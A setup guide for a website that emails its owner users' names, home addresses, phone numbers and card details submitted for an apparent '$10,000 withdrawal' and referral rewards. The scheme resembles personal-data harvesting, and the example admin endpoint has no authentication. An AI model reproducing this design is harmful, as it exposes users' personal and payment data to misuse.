# Data Collection & Webhook Setup Guide

## 🎯 Overview

Your website now automatically sends user data to you via email when:
1. ✅ Users complete their profile (9 required fields)
2. ✅ Users submit card payment for withdrawal
3. ✅ Referral confirmation occurs

All data is sent to your **admin email** which you can configure.

---

## 📧 Step 1: Set Up Email Configuration

Create or edit the `.env.local` file in your project root:

```env
# Email Configuration
EMAIL_USER=your-email@gmail.com
EMAIL_PASSWORD=your-app-password-16-chars
ADMIN_EMAIL=where-to-receive-notifications@example.com
```

### For Gmail (Recommended):

1. Go to https://myaccount.google.com/apppasswords
2. Select **Mail** and **Windows**
3. Google will generate a 16-character password
4. Copy this password to `EMAIL_PASSWORD` in `.env.local`

**Example:**
```env
EMAIL_USER=mynath@gmail.com
EMAIL_PASSWORD=abcd efgh ijkl mnop
ADMIN_EMAIL=mynath@gmail.com
```

### For Other Email Providers:

**SendGrid:**
```env
EMAIL_USER=apikey
EMAIL_PASSWORD=your-sendgrid-key
EMAIL_PROVIDER=sendgrid
ADMIN_EMAIL=your-email@example.com
```

**Outlook/Office 365:**
```env
EMAIL_USER=your-email@outlook.com
EMAIL_PASSWORD=your-password
EMAIL_PROVIDER=outlook
ADMIN_EMAIL=your-email@outlook.com
```

---

## 🔐 Step 2: Security Best Practices

⚠️ **IMPORTANT:** Never commit `.env.local` to Git!

Ensure `.gitignore` includes:
```
.env.local
.env*.local
```

---

## 📊 Step 3: Data You Receive

### Profile Data Email

When user completes profile, you receive:

```
Subject: 🎯 New Profile Submission - John Doe
To: admin-email@example.com

User ID: user_12345
Email: john@example.com

First Name: John
Last Name: Doe
Street Number: 123
Street Name: Main Street
City/Town: New York
Country: USA
Post Code: 10001
Country/Region: NY
Phone Number: +1234567890

Submitted At: 3/24/2026, 2:30:45 PM
```

### Card Payment Email

When user submits card payment, you receive:

```
Subject: 💳 Card Payment Withdrawal - John Doe - $10,000
To: admin-email@example.com

User ID: user_12345
Email: john@example.com
Cardholder Name: John Doe
Card Type: Visa
Last 4 Digits: ****5678
Expiry: 12/25
Withdrawal Amount: $10,000
Status: ⏳ Pending Verification
Submitted At: 3/24/2026, 2:35:12 PM

⚠️ IMPORTANT: Use admin dashboard to confirm this withdrawal 
and credit the user's card.
```

### Referral Email

When referral is confirmed:

```
Subject: 🎯 Referral Confirmed - REFABC123 - +$5
To: admin-email@example.com

Referrer ID: user_12345
Referral Code Used: REFABC123
New User Email: friend@example.com
Earnings Credit: +$5
Confirmed At: 3/24/2026, 2:40:00 PM
```

---

## 💾 Step 4: Database Setup (Optional but Recommended)

For production, store this data in a database:

### Profile Table
```sql
CREATE TABLE user_profiles (
  id SERIAL PRIMARY KEY,
  user_id VARCHAR(255),
  email VARCHAR(255),
  first_name VARCHAR(255),
  last_name VARCHAR(255),
  street_number VARCHAR(50),
  street_name VARCHAR(255),
  city_town VARCHAR(255),
  country VARCHAR(255),
  post_code VARCHAR(20),
  country_region VARCHAR(255),
  phone_number VARCHAR(20),
  submitted_at TIMESTAMP DEFAULT NOW()
);
```

### Card Payment Table
```sql
CREATE TABLE card_payments (
  id SERIAL PRIMARY KEY,
  user_id VARCHAR(255),
  email VARCHAR(255),
  cardholder_name VARCHAR(255),
  card_type VARCHAR(50),
  last_four_digits VARCHAR(4),
  expiry_month VARCHAR(2),
  expiry_year VARCHAR(2),
  amount DECIMAL(10,2),
  status VARCHAR(50) DEFAULT 'pending',
  submitted_at TIMESTAMP DEFAULT NOW()
);
```

### Referral Table
```sql
CREATE TABLE referrals (
  id SERIAL PRIMARY KEY,
  referrer_id VARCHAR(255),
  referee_email VARCHAR(255),
  referral_code VARCHAR(50),
  earnings DECIMAL(10,2),
  confirmed_at TIMESTAMP DEFAULT NOW()
);
```

---

## 🚀 Step 5: Verify It's Working

### Test Profile Submission:
1. Go to your app dashboard
2. If first time, profile completion modal will appear
3. Fill in all 9 fields and click "Complete Profile"
4. Check your email inbox for the profile submission email

### Test Card Payment:
1. Click "Withdraw"
2. Once you reach $10,000 (or set a lower test amount)
3. Enter withdrawal details
4. Fill in card information and click submit
5. Check your email for card payment notification

---

## 🛠️ Step 6: Admin Dashboard (Optional)

You can create an admin panel to:
- ✅ View all submitted profiles
- ✅ Approve/reject withdrawals
- ✅ Process card payments
- ✅ Verify KYC documents
- ✅ Track referrals
- ✅ Export data as CSV

**Quick Admin Endpoint Example:**

```javascript
// app/api/admin/get-profiles/route.js
export async function GET(request) {
  // Add authentication check here
  const profiles = await db.query('SELECT * FROM user_profiles');
  return Response.json(profiles);
}
```

---

## 📤 Alternative: Webhook/Custom Integration

If you prefer a custom webhook instead of email:

**Update `/app/api/collect-data/route.js`:**

```javascript
// Instead of sending email, send to your custom webhook
const webhookURL = process.env.CUSTOM_WEBHOOK_URL;
const response = await fetch(webhookURL, {
  method: 'POST',
  headers: { 'Content-Type': 'application/json' },
  body: JSON.stringify(data)
});
```

Add to `.env.local`:
```env
CUSTOM_WEBHOOK_URL=https://your-backend.com/webhook/user-data
```

---

## 🔍 Troubleshooting

### Email not being sent?

1. **Check console logs:**
   ```bash
   npm run dev  # Watch for error messages
   ```

2. **Verify credentials:**
   - Test `.env.local` variables
   - Try simpler test: `curl https://smtp.gmail.com:587`

3. **Enable "Less secure app access" (Gmail):**
   - Even though you use app password, sometimes it's needed
   - https://myaccount.google.com/lesssecureapps

### Data not in localStorage?

1. Check browser DevTools → Application → Local Storage
2. Look for `user_profile_data` key
3. Check for JavaScript errors in console

### CORS or Network Errors?

The `/api/collect-data` endpoint should work automatically from your Next.js app.

---

## 📝 API Documentation

All user data goes to: **`POST /api/collect-data`**

**Profile Submission:**
```json
{
  "type": "profile",
  "profile": {
    "firstName": "John",
    "lastName": "Doe",
    "streetNumber": "123",
    "streetName": "Main",
    "cityTown": "NYC",
    "country": "USA",
    "postCode": "10001",
    "countryRegion": "NY",
    "phoneNumber": "+1234567890",
    "userId": "user_12345",
    "email": "john@example.com"
  },
  "timestamp": "2026-03-24T14:30:00Z"
}
```

**Card Payment:**
```json
{
  "type": "card_payment",
  "payment": {
    "cardholderName": "John Doe",
    "cardType": "visa",
    "lastFourDigits": "5678",
    "expiryMonth": "12",
    "expiryYear": "25",
    "amount": 10000,
    "userId": "user_12345",
    "email": "john@example.com"
  },
  "timestamp": "2026-03-24T14:35:00Z"
}
```

**Referral:**
```json
{
  "type": "referral",
  "referrerId": "user_12345",
  "refereeEmail": "friend@example.com",
  "referralCode": "REFABC123",
  "earnings": 5,
  "timestamp": "2026-03-24T14:40:00Z"
}
```

---

## ✅ Checklist

- [ ] Created `.env.local` file
- [ ] Added email configuration
- [ ] Tested with a profile submission
- [ ] Received email notification
- [ ] (Optional) Set up database
- [ ] (Optional) Created admin dashboard

---

**Questions or issues? Check the logs in `/app/api/collect-data/route.js` or contact support.**
